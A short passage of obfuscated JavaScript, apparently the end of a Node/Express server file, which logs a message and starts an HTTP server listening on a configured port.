_0x2a1924=_0xcd3224;console[_0x2a1924(0x12a)](_0x2a1924(0x18e),_0x3c6cd5);}),app[_0xcd3224(0x189)](PORT,()=>console[_0xcd3224(0x13b)]('http\x20server\x20is\x20running\x20on\x20port:'+PORT+'!'));
